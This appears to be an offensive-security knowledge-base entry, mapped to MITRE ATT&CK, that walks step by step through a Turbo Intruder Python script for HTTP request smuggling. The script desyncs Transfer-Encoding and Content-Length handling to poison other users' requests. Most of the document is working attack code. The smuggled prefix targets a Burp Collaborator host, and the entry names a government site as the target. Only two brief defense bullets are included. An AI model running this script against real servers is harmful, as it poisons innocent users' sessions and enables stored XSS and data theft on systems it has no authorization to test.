---
tags:
  - http-request-smuggling
  - desync
  - scripting
type: procedure
tools:
  - '[[tools/Turbo-Intruder]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/import-re-module]]'
  - '[[commands/define-queueRequests-function]]'
  - '[[commands/initialize-RequestEngine]]'
  - '[[commands/start-request-engine]]'
  - '[[commands/define-smuggled-prefix]]'
  - '[[commands/calculate-chunk-size]]'
  - '[[commands/build-desync-attack-request]]'
  - '[[commands/extract-content-length]]'
  - '[[commands/adjust-content-length]]'
  - '[[commands/queue-attack-request]]'
  - '[[commands/queue-multiple-normal-requests]]'
  - '[[commands/define-handleResponse-function]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: f1ec6014-4a0a-474e-9f01-e00d9ac9c993
created_at: '2025-12-13T09:01:22.505Z'
updated_at: '2025-12-13T09:01:22.505Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Prepare Turbo Intruder Desync Script

## Summary

This procedure involves preparing a Turbo Intruder script to craft an HTTP desync request that exploits smuggling by manipulating Transfer-Encoding and Content-Length headers, allowing the smuggling of a malicious POST request to poison subsequent user requests.

## Description

The script sets up request queuing, constructs a smuggled prefix, calculates chunk sizes, adjusts headers, and queues the attack along with follow-up requests to increase poisoning chances. This targets web servers with desynchronized parsing, leading to vulnerabilities like stored XSS or data theft on platforms like WordPress sites.

## Requirements

1. Burp Suite with Turbo Intruder extension installed
2. Access to the target endpoint (https://labs.data.gov)
3. Python scripting knowledge for Turbo Intruder

## Defense

Defensive measures and detection strategies:

- Ensure consistent HTTP request parsing between front-end and back-end servers (e.g., use the same header priority)
- Monitor for anomalous Transfer-Encoding or Content-Length discrepancies in logs

## Objectives

1. Craft a desync request for smuggling
2. Queue attack and normal requests to poison sessions
3. Prepare for exploitation without affecting innocent users prematurely

## Instructions

### Step 1: Import Modules and Define Functions

**Context**: Import necessary modules and define the queueRequests function to handle request setup.

Execute [[commands/import-re-module]]:

```python
import re
```

> Imports the regular expression module for string manipulation.

Execute [[commands/define-queueRequests-function]]:

```python
def queueRequests(target, wordlists):
```

> Defines a function to queue requests in Turbo Intruder.

### Step 2: Initialize and Start Engine

**Context**: Set up and start the RequestEngine for sending requests.

Execute [[commands/initialize-RequestEngine]]:

```python
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5, requestsPerConnection=1, resumeSSL=False, timeout=10, pipeline=False, maxRetriesPerRequest=0, engine=Engine.THREADED,)
```

> Initializes the RequestEngine for sending requests.

Execute [[commands/start-request-engine]]:

```python
engine.start()
```

> Starts the request engine.

### Step 3: Construct Smuggled Request

**Context**: Build the prefix and calculate chunk size for the smuggled request.

Execute [[commands/define-smuggled-prefix]]:

```python
prefix = '''POST /hopefully404 HTTP/1.1\nHost: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1'''
```

> Defines the smuggled request prefix.

Execute [[commands/calculate-chunk-size]]:

```python
chunk_size = hex(len(prefix)).lstrip("0x")
```

> Calculates the hexadecimal chunk size of the prefix.

### Step 4: Build and Adjust Attack Request

**Context**: Modify the base request to include the smuggled chunk and adjust headers.

Execute [[commands/build-desync-attack-request]]:

```python
attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
```

> Modifies the base request to include the chunked smuggled request.

Execute [[commands/extract-content-length]]:

```python
content_length = re.search('Content-Length: (\d+)', attack).group(1)
```

> Extracts the Content-Length value using regex.

Execute [[commands/adjust-content-length]]:

```python
attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
```

> Adjusts the Content-Length to account for added chunk size.

### Step 5: Queue Requests and Handle Responses

**Context**: Queue the attack and follow-up requests, then define response handling.

Execute [[commands/queue-attack-request]]:

```python
engine.queue(attack)
```

> Queues the attack request to be sent.

Execute [[commands/queue-multiple-normal-requests]]:

```python
for i in range(14): engine.queue(target.req); time.sleep(0.05)
```

> Queues 14 normal requests with a 0.05 second delay between each.

Execute [[commands/define-handleResponse-function]]:

```python
def handleResponse(req, interesting): table.add(req)
```

> Defines a function to handle responses by adding to a table.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/import-re-module]]
- [[commands/define-queueRequests-function]]
- [[commands/initialize-RequestEngine]]
- [[commands/start-request-engine]]
- [[commands/define-smuggled-prefix]]
- [[commands/calculate-chunk-size]]
- [[commands/build-desync-attack-request]]
- [[commands/extract-content-length]]
- [[commands/adjust-content-length]]
- [[commands/queue-attack-request]]
- [[commands/queue-multiple-normal-requests]]
- [[commands/define-handleResponse-function]]

## Tools Used

- [[tools/Turbo-Intruder]]
- [[tools/Burp-Suite]]

## Tags

- [[http-request-smuggling]]
- [[desync]]
